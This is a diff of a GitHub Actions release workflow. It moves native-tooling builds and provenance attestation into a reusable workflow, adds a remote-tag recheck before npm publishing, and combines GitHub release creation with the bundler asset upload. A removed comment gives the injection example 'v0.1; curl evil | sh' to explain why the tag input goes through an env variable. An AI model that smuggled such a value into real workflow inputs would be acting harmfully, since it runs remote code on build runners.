@@ -52,8 +52,10 @@ jobs:
           TAG: ${{ inputs.tag }}
         shell: bash
         run: |
+          set -euo pipefail
+          tooling_version="$(node -p 'require("./npm/tooling/package.json").version')"
           bun scripts/check-release-version.ts framework "$TAG"
-          test "$(node -p "require('./npm/tooling/package.json').version")" = "${TAG#v}"
+          test "$tooling_version" = "${TAG#v}"
           node npm/tooling/scripts/check-platform-packages.js --metadata-only
 
       - name: Require successful CI for the exact release commit
@@ -75,299 +77,19 @@ jobs:
           test "$(jq 'length' <<<"$runs")" -eq 1
           test "$(jq -r '.[0].headSha' <<<"$runs")" = "$GITHUB_SHA"
 
-  build-tooling:
-    name: Build native tooling (${{ matrix.target }})
+  native-tooling:
     needs: preflight
-    runs-on: ${{ matrix.os }}
-    timeout-minutes: 90
+    uses: ./.github/workflows/release-build.yml
+    with:
+      verify_reproducibility: ${{ inputs.verify_reproducibility }}
     permissions:
       attestations: write
       contents: read
       id-token: write
-    strategy:
-      fail-fast: false
-      matrix:
-        include:
-          - os: ubuntu-latest
-            target: x86_64-unknown-linux-gnu
-            npm_pkg: tooling-linux-x64
-            bin_ext: ""
-            bundler_artifact: tynd-bundler
-            bundler_asset: tynd-bundler-x86_64-unknown-linux-gnu.tar.gz
-          - os: ubuntu-latest
-            target: aarch64-unknown-linux-gnu
-            npm_pkg: tooling-linux-arm64
-            bin_ext: ""
-            bundler_artifact: tynd-bundler
-            bundler_asset: tynd-bundler-aarch64-unknown-linux-gnu.tar.gz
-            cross: true
-          - os: macos-latest
-            target: x86_64-apple-darwin
-            npm_pkg: tooling-darwin-x64
-            bin_ext: ""
-            bundler_artifact: tynd-bundler
-            bundler_asset: tynd-bundler-x86_64-apple-darwin.tar.gz
-          - os: macos-latest
-            target: aarch64-apple-darwin
-            npm_pkg: tooling-darwin-arm64
-            bin_ext: ""
-            bundler_artifact: tynd-bundler
-            bundler_asset: tynd-bundler-aarch64-apple-darwin.tar.gz
-          - os: windows-latest
-            target: x86_64-pc-windows-msvc
-            npm_pkg: tooling-win32-x64
-            bin_ext: .exe
-            bundler_artifact: tynd-bundler.exe
-            bundler_asset: tynd-bundler-x86_64-pc-windows-msvc.zip
-          - os: windows-latest
-            target: aarch64-pc-windows-msvc
-            npm_pkg: tooling-win32-arm64
-            bin_ext: .exe
-            bundler_artifact: tynd-bundler.exe
-            bundler_asset: tynd-bundler-aarch64-pc-windows-msvc.zip
-    steps:
-      - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5 # v4
-        with:
-          ref: ${{ github.sha }}
-          persist-credentials: false
-
-      - uses: dtolnay/rust-toolchain@21dc36fb71dd22e3317045c0c31a3f4249868b17 # stable
-        with:
-          toolchain: "1.100.0"
-          targets: ${{ matrix.target }}
-
-      - uses: oven-sh/setup-bun@735343b667d3e6f658f44d0eca948eb6282f2b76 # v2.0.2
-        with:
-          bun-version-file: ".bun-version"
-          no-cache: true
-
-
-      - name: Install cross (linux-aarch64)
-        if: matrix.cross
-        uses: taiki-e/install-action@9ba3ac3fd006a70c6e186a683577abc1ccf0ff3a # v2.62.4
-        with:
-          tool: cross
-
-      - name: Activate MSVC ARM64 cross-compile env
-        if: matrix.target == 'aarch64-pc-windows-msvc'
-        uses: ilammy/msvc-dev-cmd@0b201ec74fa43914dc39ae48a89fd1d8cb592756 # v1.13.0
-        with:
-          arch: amd64_arm64
-
-      - name: Build tynd and tynd-mcp
-        if: ${{ !matrix.cross }}
-        run: cargo build --locked --release --target ${{ matrix.target }} -p tynd-cli --bins
-
-      - name: Cross-build tynd and tynd-mcp
-        if: matrix.cross
-        run: cross build --locked --release --target ${{ matrix.target }} -p tynd-cli --bins
-
-      - name: Build tynd-bundler
-        if: ${{ !matrix.cross }}
-        run: cargo build --locked --release --target ${{ matrix.target }} -p tynd-bundler
-
-      - name: Cross-build tynd-bundler
-        if: matrix.cross
-        run: cross build --locked --release --target ${{ matrix.target }} -p tynd-bundler
-
-      - name: Record native tooling digests before clean rebuild
-        if: inputs.verify_reproducibility
-        shell: bash
-        run: |
-          bun scripts/check-reproducible-artifact.ts record \
-            "target/${{ matrix.target }}/release/tynd${{ matrix.bin_ext }}" \
-            "$RUNNER_TEMP/tynd-digest.json"
-          bun scripts/check-reproducible-artifact.ts record \
-            "target/${{ matrix.target }}/release/tynd-mcp${{ matrix.bin_ext }}" \
-            "$RUNNER_TEMP/tynd-mcp-digest.json"
-          bun scripts/check-reproducible-artifact.ts record \
-            "target/${{ matrix.target }}/release/${{ matrix.bundler_artifact }}" \
-            "$RUNNER_TEMP/bundler-digest.json"
-
-      - name: Clean native tooling outputs
-        if: inputs.verify_reproducibility
-        run: |
-          cargo clean --locked --release --target ${{ matrix.target }} -p tynd-cli
-          cargo clean --locked --release --target ${{ matrix.target }} -p tynd-bundler
-
-      - name: Rebuild native tooling
-        if: ${{ inputs.verify_reproducibility && !matrix.cross }}
-        run: |
-          cargo build --locked --release --target ${{ matrix.target }} -p tynd-cli --bins
-          cargo build --locked --release --target ${{ matrix.target }} -p tynd-bundler
-
-      - name: Cross-rebuild native tooling
-        if: inputs.verify_reproducibility && matrix.cross
-        run: |
-          cross build --locked --release --target ${{ matrix.target }} -p tynd-cli --bins
-          cross build --locked --release --target ${{ matrix.target }} -p tynd-bundler
-
-      - name: Verify reproducible native tooling
-        if: inputs.verify_reproducibility
-        shell: bash
-        run: |
-          bun scripts/check-reproducible-artifact.ts verify \
-            "target/${{ matrix.target }}/release/tynd${{ matrix.bin_ext }}" \
-            "$RUNNER_TEMP/tynd-digest.json"
-          bun scripts/check-reproducible-artifact.ts verify \
-            "target/${{ matrix.target }}/release/tynd-mcp${{ matrix.bin_ext }}" \
-            "$RUNNER_TEMP/tynd-mcp-digest.json"
-          bun scripts/check-reproducible-artifact.ts verify \
-            "target/${{ matrix.target }}/release/${{ matrix.bundler_artifact }}" \
-            "$RUNNER_TEMP/bundler-digest.json"
-
-      - name: Stage native tooling platform package
-        shell: bash
-        run: |
-          package="npm/${{ matrix.npm_pkg }}"
-          mkdir -p "$package/bin"
-          cp "target/${{ matrix.target }}/release/tynd${{ matrix.bin_ext }}" \
-            "$package/bin/tynd${{ matrix.bin_ext }}"
-          cp "target/${{ matrix.target }}/release/tynd-mcp${{ matrix.bin_ext }}" \
-            "$package/bin/tynd-mcp${{ matrix.bin_ext }}"
-          cp "target/${{ matrix.target }}/release/${{ matrix.bundler_artifact }}" \
-            "$package/bin/tynd-bundler${{ matrix.bin_ext }}"
-          cp LICENSE "$package/LICENSE"
-
-      - name: Attest native tooling provenance
-        uses: actions/attest-build-provenance@e8998f949152b193b063cb0ec769d69d929409be # v2.4.0
-        with:
-          subject-path: |
-            npm/${{ matrix.npm_pkg }}/bin/tynd${{ matrix.bin_ext }}
-            npm/${{ matrix.npm_pkg }}/bin/tynd-mcp${{ matrix.bin_ext }}
-            npm/${{ matrix.npm_pkg }}/bin/tynd-bundler${{ matrix.bin_ext }}
-
-      - name: Upload native tooling platform package
-        uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4
-        with:
-          name: ${{ matrix.npm_pkg }}
-          path: npm/${{ matrix.npm_pkg }}/
-          if-no-files-found: error
-
-      - name: Package bundler release asset
-        working-directory: target/${{ matrix.target }}/release
-        run: bun "${{ github.workspace }}/scripts/package-release-asset.ts" "${{ matrix.bundler_artifact }}" "${{ matrix.bundler_asset }}"
-
-      - name: SHA-256 bundler sidecar (unix)
-        if: runner.os != 'Windows'
-        working-directory: target/${{ matrix.target }}/release
-        run: |
-          if command -v sha256sum >/dev/null 2>&1; then
-            sha256sum "${{ matrix.bundler_asset }}" > "${{ matrix.bundler_asset }}.sha256"
-          else
-            shasum -a 256 "${{ matrix.bundler_asset }}" > "${{ matrix.bundler_asset }}.sha256"
-          fi
-
-      - name: SHA-256 bundler sidecar (windows)
-        if: runner.os == 'Windows'
-        working-directory: target/${{ matrix.target }}/release
-        shell: pwsh
-        run: |
-          $hash = (Get-FileHash -Algorithm SHA256 "${{ matrix.bundler_asset }}").Hash.ToLower()
-          "$hash  ${{ matrix.bundler_asset }}" | Out-File -Encoding ascii -NoNewline "${{ matrix.bundler_asset }}.sha256"
-
-      - name: Attest bundler release asset
-        uses: actions/attest-build-provenance@e8998f949152b193b063cb0ec769d69d929409be # v2.4.0
-        with:
-          subject-path: |
-            target/${{ matrix.target }}/release/${{ matrix.bundler_asset }}
-            target/${{ matrix.target }}/release/${{ matrix.bundler_asset }}.sha256
-
-      - name: Upload bundler release evidence
-        uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4
-        with:
-          name: bundler-evidence-${{ matrix.target }}
-          path: |
-            target/${{ matrix.target }}/release/${{ matrix.bundler_artifact }}
-            target/${{ matrix.target }}/release/${{ matrix.bundler_asset }}
-            target/${{ matrix.target }}/release/${{ matrix.bundler_asset }}.sha256
-          if-no-files-found: error
-          retention-days: 30
-
-  release-evidence:
-    name: Verify release provenance matrix
-    needs: build-tooling
-    runs-on: ubuntu-latest
-    timeout-minutes: 20
-    permissions:
-      attestations: read
-      contents: read
-
-    steps:
-      - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5 # v4
-        with:
-          ref: ${{ github.sha }}
-          persist-credentials: false
-
-      - uses: oven-sh/setup-bun@735343b667d3e6f658f44d0eca948eb6282f2b76 # v2.0.2
-        with:
-          bun-version-file: ".bun-version"
-          no-cache: true
-
-      - name: Download bundler evidence
-        uses: actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093 # v4
-        with:
-          pattern: bundler-evidence-*
-          path: .tynd/release-evidence/bundlers
-
-      - name: Verify GitHub build attestations
-        env:
-          GH_TOKEN: ${{ github.token }}
-        run: |
-          set -euo pipefail
-          root="$GITHUB_WORKSPACE/.tynd/release-evidence"
-          subjects_tsv="$root/attested-subjects.tsv"
-          : > "$subjects_tsv"
-          mapfile -t subjects < <(
-            find "$root/bundlers" -type f \
-              \( -name '*.tar.gz' -o -name '*.zip' -o -name '*.sha256' \) -print
-          )
-          if [ "${#subjects[@]}" -ne 12 ]; then
-            echo "::error::Expected 12 attested release subjects, found ${#subjects[@]}"
-            exit 1
-          fi
-          for subject in "${subjects[@]}"; do
-            gh attestation verify "$subject" \
-              --repo "$GITHUB_REPOSITORY" \
-              --signer-workflow "$GITHUB_REPOSITORY/.github/workflows/release.yml" \
-              --source-digest "$GITHUB_SHA"
-            relative="${subject#"$root/"}"
-            digest="$(sha256sum "$subject" | cut -d ' ' -f 1)"
-            printf '%s\t%s\n' "$relative" "$digest" >> "$subjects_tsv"
-          done
-          jq -Rn \
-            --arg commit "$GITHUB_SHA" \
-            --arg generated_at "$(date -u +%Y-%m-%dT%H:%M:%SZ)" \
-            '{
-              schemaVersion: 1,
-              commit: $commit,
-              generatedAt: $generated_at,
-              subjects: [
-                inputs |
-                split("\t") |
-                {path: .[0], sha256: .[1]}
-              ]
-            }' < "$subjects_tsv" > "$root/attestations.json"
-
-      - name: Validate binary contents, checksums and provenance
-        run: |
-          bun scripts/check-release-provenance-evidence.ts \
-            --root .tynd/release-evidence \
-            --attestations .tynd/release-evidence/attestations.json \
-            --commit "$GITHUB_SHA" \
-            --output .tynd/release-provenance-matrix.json
-
-      - name: Upload verified release provenance
-        uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4
-        with:
-          name: release-provenance-matrix
-          path: .tynd/release-provenance-matrix.json
-          if-no-files-found: error
-          retention-days: 90
 
   publish:
     name: Publish npm packages (native tooling, core, host-src, plugin-sdk, test, mcp, cli, host-backed plugins)
-    needs: release-evidence
+    needs: native-tooling
     runs-on: ubuntu-latest
     timeout-minutes: 40
     # Manual approval gate — protects against force-pushed tags / token
@@ -400,21 +122,17 @@ jobs:
           bun run --cwd packages/plugin-sdk build
           bun run --cwd packages/cli build
 
-      - name: Download built sub-packages
+      - name: Download native tooling packages
         uses: actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093 # v4
         with:
-          path: artifacts/
+          pattern: tooling-*
+          path: npm/
 
-      - name: Restore staged native tooling packages into workspace
-        shell: bash
-        run: |
-          for art in artifacts/tooling-*; do
-            name=$(basename "$art")
-            cp -R "$art/." "npm/$name/"
-          done
-          for d in npm/tooling-*-*/bin; do
-            ls -la "$d"
-          done
+      - name: Download verified bundler assets
+        uses: actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093 # v4
+        with:
+          pattern: bundler-evidence-*
+          path: artifacts/
 
       - name: Restore Unix executable modes and validate native packages
         shell: bash
@@ -452,6 +170,15 @@ jobs:
             (cd "$pkg" && npm publish --access public --tag "$tag" --dry-run)
             echo "::endgroup::"
           done
+
+      - name: Recheck the remote tag before publication
+        env:
+          TAG: ${{ inputs.tag }}
+        shell: bash
+        run: |
+          set -euo pipefail
+          git fetch --no-tags origin "refs/tags/$TAG"
+          test "$(git rev-parse 'FETCH_HEAD^{commit}')" = "$GITHUB_SHA"
 
       - name: Publish native tooling platform packages
         shell: bash
@@ -529,21 +256,7 @@ jobs:
         env:
           NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}
 
-      - name: Create GitHub release
-        env:
-          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-          # Pass user-supplied tag via env, not `${{ … }}` interpolation —
-          # `workflow_dispatch.inputs.tag` lands directly in the shell
-          # otherwise and a value like `v0.1; curl evil | sh` would run.
-          TAG: ${{ inputs.tag }}
-        run: |
-          if gh release view "$TAG" --repo "$GITHUB_REPOSITORY" >/dev/null 2>&1; then
-            echo "GitHub release $TAG already exists"
-          else
-            gh release create "$TAG" --title "$TAG" --generate-notes --repo "$GITHUB_REPOSITORY"
-          fi
-
-      - name: Upload verified bundler assets to GitHub Release
+      - name: Publish GitHub release with verified bundler assets
         env:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
           TAG: ${{ inputs.tag }}
@@ -557,4 +270,12 @@ jobs:
               sort
           )
           test "${#assets[@]}" -eq 12
-          gh release upload "$TAG" "${assets[@]}" --clobber --repo "$GITHUB_REPOSITORY"
+          if draft="$(gh release view "$TAG" --repo "$GITHUB_REPOSITORY" --json isDraft --jq .isDraft 2>/dev/null)"; then
+            gh release upload "$TAG" "${assets[@]}" --clobber --repo "$GITHUB_REPOSITORY"
+            if [ "$draft" = true ]; then
+              gh release edit "$TAG" --draft=false --repo "$GITHUB_REPOSITORY"
+            fi
+          else
+            gh release create "$TAG" "${assets[@]}" --verify-tag \
+              --title "$TAG" --generate-notes --repo "$GITHUB_REPOSITORY"
+          fi
